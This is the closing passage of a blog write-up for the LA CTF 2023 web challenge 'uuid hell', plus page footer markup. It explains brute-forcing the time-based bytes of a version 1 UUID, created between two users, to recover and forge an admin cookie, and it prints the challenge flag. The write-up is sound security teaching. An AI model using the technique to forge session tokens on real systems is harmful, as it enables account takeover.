</span></span></span></code></pre></div><p>So here we are creating a user first, then we go on and create an admin. After that, we create another user. We then brute force the first 8 bytes of the uuid in the range of the two users. We then check if the hash of the admin uuid matches with any of the admin hashes. If it does we get the admin cookie.</p>
<p><a class="lightgallery" href="images/bruteforce.gif" title="bruteforce" data-thumbnail="images/bruteforce.gif">
        <img
            
            loading="lazy"
            src="images/bruteforce.gif"
            srcset="images/bruteforce.gif, images/bruteforce.gif 1.5x, images/bruteforce.gif 2x"
            sizes="auto"
            alt="images/bruteforce.gif">
    </a></p>
<p>Setting this as a cookie and visiting the page will give us the flag.</p>
<p><strong>Flag</strong>: <code>lactf{uu1d_v3rs10n_1ch1_1s_n07_r4dn0m}</code></p></div>

        <div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
                <span>Updated on 2023-02-15</span>
            </div>
            <div class="post-info-license"></div>
        </div>
        <div class="post-info-line">
            <div class="post-info-md"></div>
            <div class="post-info-share">
                <span><a href="#" title="Share on Twitter" data-sharer="twitter" data-url="http://r0h1t.me/blog/posts/uuid-hell/" data-title="uuid hell - LA CTF 2023" data-via="Lu513n" data-hashtags="web,lactf23-writeups,ctf,writeup,hash-collision,uuid"><i class="fab fa-twitter fa-fw"></i></a><a href="#" title="Share on Facebook" data-sharer="facebook" data-url="http://r0h1t.me/blog/posts/uuid-hell/" data-hashtag="web"><i class="fab fa-facebook-square fa-fw"></i></a><a href="#" title="Share on Linkedin" data-sharer="linkedin" data-url="http://r0h1t.me/blog/posts/uuid-hell/"><i class="fab fa-linkedin fa-fw"></i></a><a href="#" title="Share on WhatsApp" data-sharer="whatsapp" data-url="http://r0h1t.me/blog/posts/uuid-hell/" data-title="uuid hell - LA CTF 2023" data-web><i class="fab fa-whatsapp fa-fw"></i></a></span>
            </div>
        </div>
    </div>

    <div class="post-info-more">
        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/blog/tags/web/">web</a>,&nbsp;<a href="/blog/tags/lactf23-writeups/">lactf23-writeups</a>,&nbsp;<a href="/blog/tags/ctf/">ctf</a>,&nbsp;<a href="/blog/tags/writeup/">writeup</a>,&nbsp;<a href="/blog/tags/hash-collision/">hash-collision</a>,&nbsp;<a href="/blog/tags/uuid/">uuid</a></section>
        <section>
            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/blog/">Home</a></span>
        </section>
    </div>

    <div class="post-nav"><a href="/blog/posts/codebox/" class="prev" rel="prev" title="Codebox - DiceCTF 2023"><i class="fas fa-angle-left fa-fw"></i>Codebox - DiceCTF 2023</a>
            <a href="/blog/posts/queue-up/" class="next" rel="next" title="queue up - LA CTF 2023">queue up - LA CTF 2023<i class="fas fa-angle-right fa-fw"></i></a></div>
</div>
<div id="comments"><div id="waline" class="comment"></div><noscript>
                Please enable JavaScript to view the comments powered by <a href="https://waline.js.org/">Waline</a>.
            </noscript></div></article></div>
        </main><footer class="footer">
        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="http://r0h1t.me/" target="_blank" rel="noopener noreferrer">Rohit</a></span></div>
            <div class="footer-line"></div>
            <div class="footer-line">
            </div>
        </div></footer></div>

    <div id="fixed-buttons"><a href="#back-to-top" id="back-to-top-button" class="fixed-button" title="Back to Top">
            <i class="fas fa-arrow-up fa-fw"></i>
        </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
            <i class="fas fa-comment fa-fw"></i>
        </a>
    </div><div class="assets"><link rel="stylesheet" href="/blog/lib/waline/waline.min.css"><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":10},"comment":{"waline":{"comment":true,"copyright":true,"dark":"body[theme='dark'], body[theme='black']","el":"#waline","lang":"en","pageview":true,"serverURL":"https://r0h1t.me/blog/"}},"search":{"distance":100,"findAllMatches":true,"highlightTag":"em","ignoreFieldNorm":false,"ignoreLocation":false,"isCaseSensitive":false,"location":0,"maxResultLength":10,"minMatchCharLength":2,"noResultsFound":"No results found","snippetLength":30,"threshold":0.3,"useExtendedSearch":false},"sharerjs":true};</script><script type="text/javascript" src="/blog/lib/waline/waline.js" defer></script><script type="text/javascript" src="/blog/js/waline.min.js" defer></script><script type="text/javascript" src="/blog/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/blog/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/blog/js/theme.min.js" defer></script></div>
</body>

</html>